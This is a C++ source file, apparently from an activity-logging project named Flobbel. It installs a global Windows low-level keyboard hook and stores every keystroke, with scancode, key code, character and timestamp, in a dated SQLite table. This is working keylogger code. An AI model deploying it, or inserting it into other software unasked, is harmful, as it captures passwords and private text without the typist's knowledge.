//
// Created by Chrystalkey on 02.07.2020.
//

#include "keypress_type.h"
#include "../global_functions.h"
#include "../FlobbelSafe.h"
#include "capturecollection.h"
#include <map>
#include <memory>

HHOOK KeyboardCapture::keyboardHook = NULL;
bool KeyboardCapture::exists = false;
KeyboardCapture* KeyboardCapture::self = nullptr;


KeyboardCapture::KeyboardCapture() {
    if(exists)
        throw instance_exists_error("KeyboardCapture::KeyboardCapture");
    exists = true;
    self = this;
    infoType = FlobGlobal::Keypress;
    auto n = now();
    char date[11] = {0};
    sprintf(date,"%02d_%02d_%04d",n->tm_mday, n->tm_mon+1, n->tm_year+1900);
    keyTable = "KeyPress_"+std::string(date)+"_"+from_wstring(computerHandleStr())+"_CPACTIVITY";
    sql_table = "CREATE TABLE IF NOT EXISTS "+keyTable+"("
                "id INTEGER PRIMARY KEY,"
                "click_down INTEGER,"
                "scancode INTEGER,"
                "vkcode INTEGER,"
                "char TEXT,"
                "time TEXT);";
    FlobbelSafe::self->buildTable(sql_table);
    Log::self->info("KeyboardCapture::KeyboardCapture", "Table build verified: "+sql_table);
    keyboardHook = SetWindowsHookEx(WH_KEYBOARD_LL,llkeyhook, NULL, 0);
    Log::self->info("KeyboardCapture::KeyboardCapture", "Hook set");
}

KeyboardCapture::~KeyboardCapture() {
    UnhookWindowsHookEx(keyboardHook);
    Log::self->info("KeyboardCapture::~KeyboardCapture", "Hook Procedure unhooked");
}

void KeyboardCapture::sql_action(const Info* inf){
    auto pack = (KeypressInfo*)inf;
    accumulation_queue.push(*pack);
    if(accumulation_queue.size() < 25) return;
    std::wstring sql_starter = L"INSERT INTO "+from_string(keyTable) + L"(click_down, scancode, vkcode, char, time) VALUES"
                                "(?,?,?,?,?),(?,?,?,?,?),(?,?,?,?,?),(?,?,?,?,?),(?,?,?,?,?),"
                                "(?,?,?,?,?),(?,?,?,?,?),(?,?,?,?,?),(?,?,?,?,?),(?,?,?,?,?),"
                                "(?,?,?,?,?),(?,?,?,?,?),(?,?,?,?,?),(?,?,?,?,?),(?,?,?,?,?),"
                                "(?,?,?,?,?),(?,?,?,?,?),(?,?,?,?,?),(?,?,?,?,?),(?,?,?,?,?),"
                                "(?,?,?,?,?),(?,?,?,?,?),(?,?,?,?,?),(?,?,?,?,?),(?,?,?,?,?);";

    std::deque<sql_basetype*> arguments;
    for(auto x = accumulation_queue.front();!accumulation_queue.empty();x = accumulation_queue.front(), accumulation_queue.pop()){
        arguments.push_back(new sql_int(x.clickdown));
        arguments.push_back(new sql_int(x.scancode));
        arguments.push_back(new sql_int(x.vkcode));
        arguments.push_back(new sql_str(x.descr));
        arguments.push_back(new sql_str(x.timestamp));
    }
    FlobbelSafe::self->insert_data(sql_starter, arguments, 5);
}

LRESULT KeyboardCapture::llkeyhook(int nCode, WPARAM wParam, LPARAM lParam) {
    if(nCode == HC_ACTION) {
        KeypressInfo info;
        auto further = (KBDLLHOOKSTRUCT *) lParam;
        std::wstring time = timestamp();

        switch (wParam) {
            case WM_KEYDOWN:
                info.clickdown += 1;
                break;
            case WM_KEYUP:
                info.clickdown += 0;
                break;
            case WM_SYSKEYDOWN:
                info.clickdown += 1;
                break;
            case WM_SYSKEYUP:
                info.clickdown += 0;
                break;
            default:
                info.clickdown += -1;
        }
        info.ch = FCS.handle;
        info.infotype = FlobGlobal::Keypress;
        info.scancode = (unsigned) further->scanCode;
        info.vkcode = (unsigned) further->vkCode;
        info.timestamp = time;
        wcsncpy(info.descr, map(info.vkcode).c_str(), (size_t) 4);
        self->sql_action(&info);
    }
    return CallNextHookEx(keyboardHook,nCode,wParam,lParam);
}